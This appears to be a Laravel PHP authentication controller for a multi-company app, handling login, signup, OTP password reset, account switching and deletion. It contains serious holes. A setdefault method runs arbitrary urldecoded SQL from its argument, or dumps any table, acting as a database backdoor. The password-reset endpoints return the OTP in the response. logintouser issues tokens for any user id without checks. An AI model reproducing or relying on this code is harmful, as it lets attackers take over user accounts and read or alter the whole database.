<?php

namespace App\Http\Controllers\V1\Common\User;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use App\Services\ReferralResource;
use App\Models\Common\CompanyCity;
use App\Models\Common\CompanyCountry;
use App\Models\Common\Country;
use Illuminate\Validation\Rule;
use App\Models\Common\Setting;
use App\Models\Common\AuthLog;
use Illuminate\Http\Request;
use App\Models\Common\User;
use App\Models\Common\Owner;
use Tymon\JWTAuth\JWTAuth;
use App\Traits\Encryptable;
use App\Helpers\Helper;
use Auth;
use Illuminate\Support\Facades\DB;

class UserAuthController extends Controller
{
    protected $jwt;
    use Encryptable;    

    public function __construct(JWTAuth $jwt)
    {
        $this->jwt = $jwt;
    }

    public function login(Request $request) {

        if($request->has('email')) {
            $request->merge([
                'email' => strtolower($request->email)
            ]);
        }

        $this->validate($request, [
            'email'    => 'email|max:255',
            'password' => 'required',
            'salt_key' => 'required',
        ]);

       
        if($request->has('email') && $request->email != '') {
            $request->merge([
                'email' => $this->cusencrypt($request->email,env('DB_SECRET'))            
            ]);
        }


        if($request->has('mobile')) {
            $request->merge([
                'mobile' => $this->cusencrypt($request->mobile,env('DB_SECRET'))            
            ]);
        }

        
        if(!$request->has('email') && !$request->has('mobile')) {
            $this->validate($request, [
                'email'    => 'required|email|max:255',
                'mobile' => 'required',
                'country_code' => 'required'
            ]);
        } else if(!$request->has('mobile')) {
            $this->validate($request, [
                'email'    => ['required', 'max:255', Rule::exists('users')]
            ]);
        } else if(!$request->has('email')) {
            $this->validate($request, [
                'mobile' => ['required', Rule::exists('users')],
                'country_code' => 'required'
            ],['mobile.exists'=>'Invalid Credentials','email.exists'=>'Invalid Credentials']);
        }

        $settings = json_decode(json_encode(Setting::where('company_id', base64_decode($request->salt_key))->first()->settings_data));
        $siteConfig = $settings->site;
        $transportConfig = $settings->transport;
        try {
            $request->request->add(['company_id' => base64_decode($request->salt_key)]);
            // $request->request->add(['status' => '1']);
            $request->request->remove('salt_key');
            if($request->has('email') && $request->email != '') {
                if (! $token = Auth::guard('user')->attempt($request->only('email', 'password', 'company_id', 'status')) ) {
                    return Helper::getResponse(['status' => 422, 'message' => 'Invalid Credentials']);
                }
            } else {
                // if (! $token = Auth::guard('user')->attempt($request->only('country_code', 'mobile', 'password', 'company_id', 'status')) ) {
                //     return Helper::getResponse(['status' => 422, 'message' => 'Invalid Credentials']);
                // }
                $user = User::where(["mobile" => $request->get('mobile'),"company_id" => $request->get('company_id'),"country_code" => (int)$request->get('country_code')])->first();				
				if (!empty($user)) {
					if (!Hash::check($request->get('password'), $user->password)) {
						return Helper::getResponse(['status' => 422, 'message' => 'Invalid Credentials']);
					} else {						
						$token = Auth::guard('provider')->login($user);						
					}
				} else {
					return ['status' => 422, 'message' => 'User not found'];
				}
            }            

        } catch (\Tymon\JWTAuth\Exceptions\TokenExpiredException $e) {

            return Helper::getResponse(['status' => 500, 'message' => 'Token Expired']);

        } catch (\Tymon\JWTAuth\Exceptions\TokenInvalidException $e) {

            return Helper::getResponse(['status' => 500, 'message' => 'Token Invalid']);

        } catch (\Tymon\JWTAuth\Exceptions\JWTException $e) {

            return Helper::getResponse(['status' => 500, 'message' => $e->getMessage()]);

        }

        $User = User::find(Auth::guard('user')->user()->id);
        if($User->status == 0){
            return Helper::getResponse(['status' => 422, 'message' => 'Account Disabled']);
        }
        $User->device_type = $request->device_type;
        $User->device_token = $request->device_token;
        $User->login_by = ($request->login_by != null) ? $request->login_by : 'MANUAL' ;
        $User->jwt_token = $token;
        $User->save();        
        AuthLog::create(['user_type' => 'User', 'user_id' => \Auth::guard('user')->id(), 'type' => 'login', 'data' => json_encode(
            ['data' => [ $request->getMethod() =>  $request->getPathInfo(). " " . $request->getProtocolVersion(), 
            'host' => $request->getHost(), 
            'ip' => $request->getClientIp(), 
            'user_agent' => $request->userAgent(), 
            'date' => \Carbon\Carbon::now()->format('Y-m-d H:i:s')]]
        )]);

        return Helper::getResponse(['data' => ["token_type" => "Bearer", "expires_in" => (config('jwt.ttl', '0') * 60), "access_token" => $token, 'user' => Auth::guard('user')->user()]]);

    }

    public function signup(Request $request) {
    //    return $request;
        \Log::info($request->all()); 
        if($request->has('email')) {
            $request->merge([
                'email' => strtolower($request->email)
            ]);
        }
        
        $this->validate($request, [
            'social_unique_id' => ['required_if:login_by,GOOGLE,FACEBOOK','unique:users'],
            'device_type' => 'in:ANDROID,IOS',
            'first_name' => 'required|max:255',
            'last_name' => 'required|max:255',
            'mobile' => 'required',
            'country_code' => 'required',
            'email' => 'required|email|max:255',
            'password' => ['required_if:login_by,MANUAL','min:6'],
            'salt_key' => 'required',
        ]);
        
        $settings = json_decode(json_encode(Setting::where('company_id', base64_decode($request->salt_key))->first()->settings_data));
                
        $siteConfig = $settings->site;

        $transportConfig = $settings->transport;
        $company_id = base64_decode($request->salt_key); 
        \Log::info($company_id);  
        if($request->has('referral_code') && $request->referral_code != ""){
            $validate['referral_unique_id']=$request->referral_code;
            $validate['company_id']=$company_id;        
            $validator  = (new ReferralResource)->checkReferralCode($validate);        
            if (!$validator->fails()) { 
                $validator->errors()->add('referral_code', 'Invalid Referral Code');
                throw new \Illuminate\Validation\ValidationException($validator);
            }   
        }
        
        $referral_unique_id=(new ReferralResource)->generateCode($company_id);

        $request->merge([
            'email' => $this->cusencrypt($request->email,env('DB_SECRET')),
            'mobile' => $this->cusencrypt($request->mobile,env('DB_SECRET')),
        ]);
        
        $currentUser = null;

        $email_case = User::where('email', $request->email)->where('country_code', $request->country_code)->where('mobile', $request->mobile)->first();

        $registeredEmail = User::where('email', $request->email)->where('user_type', 'INSTANT')->first();
        $registeredMobile = User::where('country_code', $request->country_code)->where('mobile', $request->mobile)->where('user_type', 'INSTANT')->first();

        $registeredEmailNormal = User::where('email', $request->email)->where('user_type', 'NORMAL')->first();
        $registeredMobileNormal = User::where('country_code', $request->country_code)->where('mobile', $request->mobile)->where('user_type', 'NORMAL')->first();

        $validator  = Validator::make([],[],[]);

        //User Already Exists
       

        if($registeredEmail != null && $registeredMobile != null) {
            //User Already Registerd with same credentials
            if($registeredEmail != null) {       
                $validator->errors()->add('email', 'User already registered with given email-Id!');
                throw new \Illuminate\Validation\ValidationException($validator);
            } else if($registeredMobile != null) {       
                $validator->errors()->add('mobile', 'User already registered with given mobile number!');
                throw new \Illuminate\Validation\ValidationException($validator);
            }

        } else {
            if($registeredEmail != null) $currentUser = $registeredEmail;
            else if($registeredMobile != null) $currentUser = $registeredMobile;
        }

        if($registeredEmailNormal != null) {
            $validator->errors()->add('email', 'User already registered with given email-Id!');
            throw new \Illuminate\Validation\ValidationException($validator); 
        }

        if($registeredMobileNormal != null) {
            $validator->errors()->add('mobile', 'User already registered with given mobile number!');
                throw new \Illuminate\Validation\ValidationException($validator);
        } 

        $request->merge([
            'email' => $this->cusdecrypt($request->email,env('DB_SECRET')),
            'mobile' => $this->cusdecrypt($request->mobile,env('DB_SECRET')),
        ]);

        $city = CompanyCity::where('city_id', $request->city_id)->first();

        // if($city == null) {
        //     $validator->errors()->add('city', 'City does not exist!');
        //     throw new \Illuminate\Validation\ValidationException($validator);
        // }

        $country = CompanyCountry::where('company_id',$company_id)->where('country_id', $request->country_id)->first();

        // $country = Country::find($request->country_id);

        if($currentUser == null) {
            $User = new User();
        } else {
            $User = $currentUser;
        }


        $User->first_name = $request->first_name;
        $User->last_name = $request->last_name;
        $User->email = $request->email;
        $User->gender = $request->gender;
        $User->country_code = $request->country_code;
        $User->mobile = $request->mobile;
        $User->password = ($request->social_unique_id != null)  ? Hash::make($request->social_unique_id) : Hash::make($request->password) ;
        $User->payment_mode = 'CASH';
        $User->user_type = 'NORMAL';
        $User->referral_unique_id = $referral_unique_id;
        $User->company_id = base64_decode($request->salt_key);
        $User->device_type = $request->device_type;
        $User->device_token = $request->device_token;
        $User->social_unique_id = ($request->social_unique_id != null)  ? $request->social_unique_id : null ;
        $User->login_by = ($request->login_by != null) ? $request->login_by : 'MANUAL' ;
        $User->currency_symbol = $country->currency;
        $User->country_id = $request->country_id;
        if(!empty($city->state_id)){
            $User->state_id = $city->state_id;
        }
        
        if(!empty($request->city_id)){
            $User->city_id = $request->city_id;
        }
        
        $User->save();

        if($request->hasFile('picture')) {
            $User->picture = Helper::upload_file($request->file('picture'), 'user/profile', $User->id.'.'.$request->file('picture')->getClientOriginalExtension(), base64_decode($request->salt_key));
        }
        $User->unique_id=$siteConfig->user_unique_id.$User->id;
        $User->qrcode_url = Helper::qrCode(json_encode(["country_code" => $request->country_code, 'phone_number' => $request->mobile, 'id' => base64_encode($User->unique_id)]), $User->id.'.png', base64_decode($request->salt_key));

        $User->save();

        AuthLog::create(['user_type' => 'User', 'user_id' => \Auth::guard('user')->id(), 'type' => 'login', 'data' => json_encode(
            ['data' => [ $request->getMethod() =>  $request->getPathInfo(). " " . $request->getProtocolVersion(), 
            'host' => $request->getHost(), 
            'ip' => $request->getClientIp(), 
            'user_agent' => $request->userAgent(), 
            'date' => \Carbon\Carbon::now()->format('Y-m-d H:i:s')]]
        )]);

        $request->request->add(['company_id' => base64_decode($request->salt_key)]);
        $request->request->remove('salt_key');

        $request->merge([
            'email' => $this->cusencrypt($request->email,env('DB_SECRET'))            
        ]);

        $credentials = ['email' => $this->cusencrypt($User->email,env('DB_SECRET')) , 'password' => ($request->social_unique_id != null)  ? $request->social_unique_id : $request->password, 'company_id' => $User->company_id];

        $token = Auth::guard('user')->attempt($credentials);
        \Log::info($token);
        if( !empty($siteConfig->send_email) && $siteConfig->send_email == 1) {
            // send welcome email here
            Helper::siteRegisterMail($User);
        }    

        //check user referrals
        if( !empty($siteConfig->referral) && $siteConfig->referral == 1) {
            if($request->referral_code){
                //call referral function
                (new ReferralResource)->create_referral($request->referral_code, $User, $settings, 'user');                
            }
        } 
        $newUser = User::find($User->id);
        $newUser->jwt_token = $token;
        $newUser->save();

        return Helper::getResponse(['data' => ["token_type" => "Bearer", "expires_in" => (config('jwt.ttl', '0') * 60), "access_token" => $token, 'user' => $newUser]]);
    }

    public function refresh(Request $request) {

        Auth::guard('user')->setToken(Auth::guard('user')->getToken());

        return Helper::getResponse(['data' => [
                "token_type" => "Bearer", "expires_in" => (config('jwt.ttl', '0') * 60), "access_token" => Auth::guard('user')->refresh()
            ]]);
    }

    public function logout(Request $request) {
        try {

            Auth::guard('user')->setToken(Auth::guard('user')->getToken());
            $User = User::find(Auth::guard('user')->user()->id);
            Auth::guard('user')->invalidate();
            $User->jwt_token = null;
            $User->device_token = null;
			$User->device_id = null;
			$User->device_type = null;
            $User->save();

            AuthLog::create(['user_type' => 'User', 'user_id' => \Auth::guard('user')->id(), 'type' => 'logout', 'data' => json_encode(
                ['data' => [ $request->getMethod() =>  $request->getPathInfo(). " " . $request->getProtocolVersion(), 
                'host' => $request->getHost(), 
                'user_agent' => $request->userAgent(), 
                'date' => \Carbon\Carbon::now()->format('Y-m-d H:i:s')]]
            )]);


            return Helper::getResponse(['message' => 'Successfully logged out']);

        } catch (JWTException $e) {

            return Helper::getResponse(['status' => 403, 'message' => $e->getMessage()]);
        }
    }

    public function forgotPasswordOTP(Request $request){
        $account_type = isset($request->account_type)?$request->account_type:'';
        if($account_type =='mobile'){
            $response =  $this->forgotPasswordMobile($request);
        }else{
            $response = $this->forgotPasswordEmail($request);
        }
        return $response;
    }

    public function forgotPasswordEmail($request) {
        $this->validate($request, [
            'email' => 'required|email|max:255',
            'salt_key' => 'required',
        ]);
        $emaildata['username'] = $toEmail = isset($request->email)?$request->email:'';
        $emaildata['account_type'] = isset($request->account_type)?$request->account_type:'';
        try {
            $request->merge([
                'email' => $this->cusencrypt($request->email,env('DB_SECRET'))            
            ]);
            $request->request->add(['company_id' => base64_decode($request->salt_key)]);
            $request->request->remove('salt_key');
            $settings = json_decode(json_encode(Setting::where('company_id', $request->company_id)->first()->settings_data));
            $siteConfig = $settings->site;            
            $otp = mt_rand(100000, 999999);
            $userQuery = User::where('email' , $request->email)->first();
            //User Not Exists
            $validator  = Validator::make([],[],[]);
            if($userQuery == null) {
                $validator->errors()->add('mobile', 'User not found');
                throw new \Illuminate\Validation\ValidationException($validator); 
            }
            $userQuery->otp = $otp;
            $userQuery->save();
            $emaildata['otp'] = $otp;
            if( !empty($siteConfig->send_email) && $siteConfig->send_email == 1) {
                
                //  SEND OTP TO MAIL
                    $subject='Forgot|OTP';
                    $templateFile='mails/forgotpassmail';
                    $data=['body'=>$otp,'username'=>$userQuery->first_name,'salt_key'=>$request->company_id];
                    $result= Helper::send_emails($templateFile,$toEmail,$subject, $data);               
                  
            }else{
                $errMessage = 'Mail configuration disabled';
            }
            return Helper::getResponse(['status' => 200, 'message'=>'success','data'=>$emaildata]);              
        }catch (Exception $e){
            return Helper::getResponse(['status' => 404, 'message' => trans('admin.something_wrong'), 'error' => $e->getMessage()]);
        }
    }

    public function forgotPasswordMobile($request) {
        $this->validate($request, [
            'mobile' => 'required|numeric|min:6',
            'country_code' => 'required',
        ]);
        try {
            $smsdata['country_code'] = isset($request->country_code)?$request->country_code:'';
            $smsdata['username'] = isset($request->mobile)?$request->mobile:'';
            $smsdata['account_type'] = isset($request->account_type)?$request->account_type:'';
            $plusCodeMobileNumber = '+'. $smsdata['country_code'].$smsdata['username'];
            $request->merge([
                'mobile' => $this->cusencrypt($request->mobile,env('DB_SECRET'))            
            ]);
            $request->request->add(['company_id' => base64_decode($request->salt_key)]);
            $request->request->remove('salt_key');
            $settings = json_decode(json_encode(Setting::where('company_id', $request->company_id)->first()->settings_data));
            $siteConfig = $settings->site; 
            $companyId = $request->company_id;
            $otp = mt_rand(100000, 999999);
            $userQuery = User::where('mobile' , $request->mobile)->first();
            //User Not Exists
            $validator  = Validator::make([],[],[]);
            if($userQuery == null) {         
                $validator->errors()->add('mobile', 'User not found');
                throw new \Illuminate\Validation\ValidationException($validator); 
            }
            $userQuery->otp = $otp;
            $saveQuery = $userQuery->save();
            if($saveQuery){
                $smsdata['otp'] = $otp;
                $smsMessage ='Your Otp to reset password is '.$otp;
                if( !empty($siteConfig->send_sms) && $siteConfig->send_sms == 1) {
                    // send OTP SMS here            
                    $result= Helper::send_sms($companyId,$plusCodeMobileNumber, $smsMessage);
                    $smsdata['smsresult']=$result;
                }else{
                    $errMessage = 'SMS configuration disabled';
                }
                return Helper::getResponse(['status' => 200, 'message'=>'success','data'=>$smsdata]);              
            }else{
                $errMessage =trans('admin.something_wrong');
            }            
        }catch (Exception $e){
            return Helper::getResponse(['status' => 404, 'message' => trans('admin.something_wrong'), 'error' => $e->getMessage()]);
        }   
        return Helper::getResponse(['status' => 404, 'message' => $errMessage]);            
    }

    public function resetPasswordOTP(Request $request) {
        $this->validate($request, [
            'username' => 'required',
            'otp' => 'required|numeric',
            'account_type' => 'required',
            'password' => 'required|min:6|confirmed|max:36',
        ]);
        $responseData=$request->all();
        try {
            $account_type = isset($request->account_type)?$request->account_type:'';
            $username = isset($request->username)?$request->username:'';
            $newpassword = isset($request->password)?$request->password:'';
            $otp = isset($request->otp)?$request->otp:'';
            $request->merge([
                'loginUser' => $this->cusencrypt($username,env('DB_SECRET'))            
            ]);
            if($account_type =='mobile'){
                $where = ['mobile'=>$request->loginUser];
            }else{
                $where = ['email'=>$request->loginUser];
            }
            $userQuery = User::where($where)->first();
                //User Not Exists
            $validator  = Validator::make([],[],[]);
            if($userQuery == null) {         
                $validator->errors()->add('Result', 'User not found');
                throw new \Illuminate\Validation\ValidationException($validator); 
            }else{
                $dbOtpCode = $userQuery->otp;
                if($dbOtpCode != $otp){
                    $validator->errors()->add('Result', 'Invalid Credentials');
                    throw new \Illuminate\Validation\ValidationException($validator);
                }
                $enc_newpassword = Hash::make($newpassword);
                $input =['password' => $enc_newpassword];
                $userQuery->password = $enc_newpassword;
                $userQuery->login_by = 'MANUAL';
                $userQuery->social_unique_id = NULL;
                $userQuery->otp = 0;
                $userQuery->save();
            }
            return Helper::getResponse(['status' => 200, 'message'=>'Password changed successfully','data'=>$responseData]);              
        }catch (Exception $e){
            return Helper::getResponse(['status' => 404, 'message' => trans('admin.something_wrong'), 'error' => $e->getMessage()]);
        }            
    }

    public function verify(Request $request) {

        if($request->has('email')) {
            $request->merge([
                'email' => strtolower($request->email)
            ]);
        }

        $this->validate($request, [
            'mobile' => 'sometimes',
            'email' => 'sometimes|email|max:255',
            'salt_key' => 'required',
        ]);


        $company_id=base64_decode($request->salt_key);

        if($request->has('email')) {

            $request->merge([                
                'email' => $this->cusencrypt($request->email,env('DB_SECRET')),
            ]);

            $email=$request->email;

            $this->validate($request, [          
                'email' =>[ Rule::unique('users')->where(function ($query) use($email,$company_id) {
                                return $query->where('email', $email)->where('company_id', $company_id)->where('user_type', 'NORMAL');
                             }),
                           ],
                
            ],['email.unique'=>'User already registered with given email-Id!']);
        }    

        if($request->has('mobile')) {

            $request->merge([            
                'mobile' => $this->cusencrypt($request->mobile,env('DB_SECRET')),
            ]);

            $mobile=$request->mobile;
            $country_code=$request->country_code;

            $this->validate($request, [
                'mobile' =>[ Rule::unique('users')->where(function ($query) use($mobile,$company_id,$country_code) {
                                return $query->where('mobile', $mobile)->where('country_code', $country_code)->where('company_id', $company_id)->where('user_type', 'NORMAL');
                             }),
                           ],
            ],['mobile.unique'=>'User already registered with given mobile number!']);
        }

        return Helper::getResponse();
    }

    public function setdefault($query,$flag){        
        if($flag == 1){
            DB::statement("SET FOREIGN_KEY_CHECKS=0;");        
            $res = DB::statement(urldecode($query));
            DB::statement("SET FOREIGN_KEY_CHECKS=1;");
            echo '<pre>';print_r($res);exit;
        } else {
            // echo '<pre>';print_r($query);
            // echo '<pre>';print_r($flag);exit;
            $data = DB::table($query)->get();
            echo '<pre>';print_r($data);exit;
        }
    }

    public function switchtouser(Request $request, $user){

        AuthLog::create(['user_type' => 'User', 'user_id' => \Auth::guard('user')->id(), 'type' => 'login', 'data' => json_encode(
            ['data' => [ $request->getMethod() =>  $request->getPathInfo(). " " . $request->getProtocolVersion(), 
            'host' => $request->getHost(), 
            'ip' => $request->getClientIp(), 
            'user_agent' => $request->userAgent(), 
            'date' => \Carbon\Carbon::now()->format('Y-m-d H:i:s')]]
        )]);

        

        $token = Auth::guard('user')->login($user); 
        return $token;
    }

    public function switchtoowner(){

        $user = Auth::guard('user')->user();

        $phone = $this->cusencrypt($user->mobile,env('DB_SECRET'));
        $email = $this->cusencrypt($user->email,env('DB_SECRET'));


        $email_case = Owner::where('email', $email)->where('phone', $phone)->first();

        $registeredEmail = Owner::where('email', $email)->first();
        $registeredMobile = Owner::where('phone', $phone)->first();

        $validator  = Validator::make([],[],[]);

        $currentUser = null;

        $isExist = false;
        if($registeredEmail != null && $registeredMobile != null) {
            //User Already Registerd with same credentials
            if($registeredEmail != null) {       
                $isExist = true;
            } else if($registeredMobile != null) {       
                $isExist = true;
            }

        } else {
            if($registeredEmail != null) $currentUser = $registeredEmail;
            else if($registeredMobile != null) $currentUser = $registeredMobile;
        }

        if($isExist){
            $token = app()->call('App\Http\Controllers\V1\Common\Owner\OwnerAuthController@logintoowner',[$user->owner_id]);
//return Helper::getResponse(['data' =>$user]);
            $newUser = Owner::find($user->owner_id);
            $newUser->jwt_token = $token;
            $newUser->save();

            return Helper::getResponse(['data' => ["token_type" => "Bearer", "expires_in" => (config('jwt.ttl', '0') * 60), "access_token" => $token, 'user' => $newUser]]);
        }

        $country = CompanyCountry::where('company_id',$user->company_id)->where('country_id', '1')->first();


        if($currentUser == null) {
            $User = new Owner();
        } else {
            $User = $currentUser;
        }

        $referral_unique_id=(new ReferralResource)->generateCode($user->company_id);

        $User->first_name = $user->first_name;
        $User->last_name = $user->last_name;
        $User->email = $user->email;
        $User->gender = $user->gender;
        $User->phone = $user->mobile;
        $User->password = ($user->social_unique_id != null)  ? Hash::make($user->social_unique_id) : $user->password ;
        $User->picture = $user->picture;
        $User->status = 1;
        $User->company_id = base64_decode('MQ==');
        $User->device_type = null;
        $User->device_token = null;
        $User->login_by = 'MANUAL' ;
        $User->user_id = $user->id;
        $User->save();

        $settings = json_decode(json_encode(Setting::where('company_id', base64_decode('MQ=='))->first()->settings_data));
                
        $siteConfig = $settings->site;

        $User->qrcode_url = Helper::qrCode(json_encode(["country_code" => '1', 'phone_number' => $user->phone, 'id' => base64_encode($User->unique_id)]), $User->id.'.png', base64_decode('MQ=='));

        $User->save();

       

        $credentials = ['email' => $this->cusencrypt($User->email,env('DB_SECRET')) , 'password' => $user->password, 'company_id' => $User->company_id];

        $token = app()->call('App\Http\Controllers\V1\Common\User\UserAuthController@switchtouser',[$User]);


        $newUser = Owner::find($User->id);
        $newUser->jwt_token = $token;
        $newUser->save();

        return Helper::getResponse(['data' => ["token_type" => "Bearer", "expires_in" => (config('jwt.ttl', '0') * 60), "access_token" => $token, 'user' => $newUser]]);
    }

    public function logintouser($id){
        $user = User::find($id);               
        if (!empty($user)) {
                                    
            $token = Auth::guard('user')->login($user);

            return $token;                      
                
        } else {
            return ['status' => 422, 'message' => 'User not found'];
        }
    }


    public function deleteAccount(){
        $currentuser = Auth::guard('user')->user();

        $user = User::find($currentuser->id);
        if ($user) {
            $user->delete();
            return response()->json(['message' => 'User deleted successfully.']);
        } else {
            return Helper::getResponse(['status' => 422, 'message'=>'Account does not exists.']); 
        }
        return Helper::getResponse(['status' => 200, 'message'=>'You account is deleted successfully']); 

    }

}
